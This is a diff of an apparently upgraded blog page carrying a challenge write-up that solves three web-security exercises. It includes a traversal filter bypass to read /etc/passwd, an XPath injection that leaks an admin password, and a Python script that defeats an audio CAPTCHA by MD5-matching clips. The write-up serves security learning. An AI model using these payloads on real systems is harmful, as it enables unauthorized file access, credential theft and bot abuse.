@@ -1,3 +1,4 @@
+
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -11,10 +12,11 @@
     <link rel="shortcut icon" href="/favicon.ico">
 
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
-    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=9a2fb6892c">
-    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=9a2fb6892c">
+    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=8e59806e20">
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=8e59806e20">
     <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,400">
 
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
     <link rel="canonical" href="http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <link rel="amphtml" href="http://www.spect.cl/blog/2011/11/solution-to-8-8-appsec-challenge/amp/">
@@ -46,7 +48,12 @@
     "publisher": {
         "@type": "Organization",
         "name": "SPECT Research",
-        "logo": "http://www.spect.cl/ghost/img/ghosticon.jpg"
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://www.spect.cl/favicon.ico",
+            "width": 16,
+            "height": 16
+        }
     },
     "author": {
         "@type": "Person",
@@ -68,12 +75,19 @@
     "description": "In this post I&#x27;ll show the solution to the three challenges of 8dot8 AppSec Challenge. The site is not available anymore so the challenge description won&#x27;t be very detailed. Any information on other ways to solve it are welcome. Challenge 1: Directory Traversal The challenge lied in including successfully the",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "http://www.spect.cl"
+        "@id": "http://www.spect.cl/"
     }
 }
     </script>
 
-    <meta name="generator" content="Ghost 0.11">
+    <script type="text/javascript" src="/public/ghost-sdk.min.js?v=8e59806e20"></script>
+<script type="text/javascript">
+ghost.init({
+	clientId: "ghost-frontend",
+	clientSecret: "56ef4883a9ca"
+});
+</script>
+    <meta name="generator" content="Ghost 1.16">
     <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://www.spect.cl/rss/">
     <script>
 var disqus_shortname = 'spectresearch';
@@ -122,67 +136,51 @@ var ga_id = 'UA-18043187-1';
         </header>
 
         <section class="post-content">
-            <p>In this post I'll show the solution to the three challenges of <em><a href="http://www.8dot8.org/">8dot8</a> AppSec Challenge</em>. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome.</p>
-
+            <div class="kg-card-markdown"><p>In this post I'll show the solution to the three challenges of <em><a href="http://www.8dot8.org/">8dot8</a> AppSec Challenge</em>. The site is not available anymore so the challenge description won't be very detailed. Any information on other ways to solve it are welcome.</p>
 <h2 id="challenge1directorytraversal">Challenge 1: Directory Traversal</h2>
-
 <p>The challenge lied in including successfully the file <code>/etc/passwd</code> through a parameter vulnerable to a <em>Directory  Traversal</em> attack. Although, the exploitation wasn't immediate. The passed value through the parameter was sanitized by a function that doesn't allow to scale directories to reach the desired file. To illustrate what happened, the following code snippet.</p>
-
-<pre><code class="language- language-python">&gt;&gt;&gt; param = '../../../../../../etc/passwd'
+<pre><code class="language-language-python">&gt;&gt;&gt; param = '../../../../../../etc/passwd'
 &gt;&gt;&gt; param.replace('../', '')
-'etc/passwd'  
+'etc/passwd'
 </code></pre>
-
 <p>With those conditions, I had to find a vector that could bypass that sanitization function. The pattern is showed next.</p>
-
-<pre><code class="language- language-python">&gt;&gt;&gt; param = '....//....//....//....//....//....//etc/passwd'
+<pre><code class="language-language-python">&gt;&gt;&gt; param = '....//....//....//....//....//....//etc/passwd'
 &gt;&gt;&gt; param.replace('../', '')
-'../../../../../../etc/passwd'  
+'../../../../../../etc/passwd'
 </code></pre>
-
 <p>With that vector the challenge was solved.</p>
-
 <h2 id="challenge2xpathinjection">Challenge 2: XPath Injection</h2>
-
-<p>The second challenge involved a form vulnerable to <em>XPath Injection</em>. If even it could be solved using the <em>Blind XPath Injection</em> technique, first confirming the length with <code>string-length(/users/user[1]/password)</code> and then getting the chars with <code>substring()</code>, I utilized the concatenation. The admin password had to be concatenated with the second user's name, and it should show  <code>admin_password+name_second_user</code>, however it showed the admin password. My vector of attack to get the admin's password was: </p>
-
+<p>The second challenge involved a form vulnerable to <em>XPath Injection</em>. If even it could be solved using the <em>Blind XPath Injection</em> technique, first confirming the length with <code>string-length(/users/user[1]/password)</code> and then getting the chars with <code>substring()</code>, I utilized the concatenation. The admin password had to be concatenated with the second user's name, and it should show  <code>admin_password+name_second_user</code>, however it showed the admin password. My vector of attack to get the admin's password was:</p>
 <p><code>1]/password|/users/user[2</code></p>
-
 <p>With the above vector, the final string was: <code>/users/user[1]/password|/users/user[2]/name</code></p>
-
 <p>As result, I got:</p>
-
-<pre><code class="language- language-html">/users/user[1]/password|/users/user[2]/name --&gt;Wrong password!&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+<pre><code class="language-language-html">/users/user[1]/password|/users/user[2]/name --&gt;Wrong password!&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
     &lt;form method="POST" action=""&gt;
     &lt;label for="user"&gt;User:&lt;/label&gt;&lt;br/&gt;
     &lt;input id="user" name="user" value="iLovePwnies"/&gt;&lt;br/&gt;
 </code></pre>
-
 <h2 id="challenge3captcha">Challenge 3: Captcha</h2>
-
-<p>I found the last challenge the most entertaining to solve. It was a <em>CAPTCHA</em> with images hard to decrypt through some script, but it had the option to play the audio with each letter present in the <em>CAPTCHA</em> word. The security flaw was added with that feature since, in spite of the name of the audio files were <br>
+<p>I found the last challenge the most entertaining to solve. It was a <em>CAPTCHA</em> with images hard to decrypt through some script, but it had the option to play the audio with each letter present in the <em>CAPTCHA</em> word. The security flaw was added with that feature since, in spite of the name of the audio files were<br>
 random, each word was always the same word pronounced.</p>
-
 <p>For this challenge, I first downloaded the audio files and I created my letter dictionary, relating the <em>MD5</em> sum of each audio file with its pronounced letter, up to complete the alphabet. Then, the script requested the page with the <em>CAPTCHA</em>, reviewed the <em>HTML</em> code, got the audio filenames, downloaded them and the script compared their <em>MD5</em> sum to the sums in my letter dictionary. That procedure returned me the key. All that 2500 times, because it was necessary to solve 500 CAPTCHAS of 5 letters each one. The code was the following:</p>
-
-<pre><code class="language- language-python">#!/usr/bin/env python
-import sys  
-import urllib  
-import urllib2  
-import re  
-import hashlib  
-import os  
+<pre><code class="language-language-python">#!/usr/bin/env python
+import sys
+import urllib
+import urllib2
+import re
+import hashlib
+import os
 import socket
 
 origGetAddrInfo = socket.getaddrinfo
 
-def getAddrInfoWrapper(host, port, family=0, socktype=0, proto=0, flags=0):  
+def getAddrInfoWrapper(host, port, family=0, socktype=0, proto=0, flags=0):
     return origGetAddrInfo(host, port, socket.AF_INET, socktype, proto, flags)
 
 # replace the original socket.getaddrinfo by our version
 socket.getaddrinfo = getAddrInfoWrapper
 
-letters = {  
+letters = {
     'A': 'fc630d2b617c8b7e94c4812bfdb4c151',
     'B': '8ff4175902822c97a2f198bb17b596c8',
     'C': 'd6e9c5eb4bf9e2bb50dadf197fd9f9ad',
@@ -211,15 +209,15 @@ letters = {
     'Z': '684fcaa5a5c61c317b7b3ad2575a8066'
 }
 
-i = 0  
-captcha = ''  
-url = 'https://challenge.dreamlab.net/?captcha=%s&amp;page=challenge&amp;cid=11'  
-play_url = 'https://challenge.dreamlab.net/challenges_dir/11/playAudio.php?audio=%s'  
-cookie = 'PHPSESSID=eo251g8dl5obdbvjjbm49kmeg3'  
-pattern = re.compile('var soundQueue = new Array\(\n\t"(.*)","x"')  
+i = 0
+captcha = ''
+url = 'https://challenge.dreamlab.net/?captcha=%s&amp;page=challenge&amp;cid=11'
+play_url = 'https://challenge.dreamlab.net/challenges_dir/11/playAudio.php?audio=%s'
+cookie = 'PHPSESSID=eo251g8dl5obdbvjjbm49kmeg3'
+pattern = re.compile('var soundQueue = new Array\(\n\t"(.*)","x"')
 score = re.compile('You\'ve solved &lt;em&gt;(\d+)&lt;/em&gt;')
 
-while True:  
+while True:
     print 'Requesting %s' % (url % captcha)
     req = urllib2.Request(url % captcha)
     req.add_header('Cookie', cookie)
@@ -244,8 +242,8 @@ while True:
     i = i + 1
     print 'Sending packet #%d' % i
 </code></pre>
-
 <p>Greetings and I wait another solutions!</p>
+</div>
         </section>
 
         <footer class="post-footer">
@@ -315,7 +313,7 @@ while True:
 
 
         <footer class="site-footer clearfix">
-            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2016</section>
+            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2017</section>
         </footer>
 
     </div>
@@ -334,9 +332,9 @@ while True:
   }
 </script>
 
-    <script type="text/javascript" src="/assets/js/prism.js?v=9a2fb6892c"></script>
-    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=9a2fb6892c"></script>
-    <script type="text/javascript" src="/assets/js/index.js?v=9a2fb6892c"></script>
+    <script type="text/javascript" src="/assets/js/prism.js?v=8e59806e20"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=8e59806e20"></script>
+    <script type="text/javascript" src="/assets/js/index.js?v=8e59806e20"></script>
 
 
 </body>
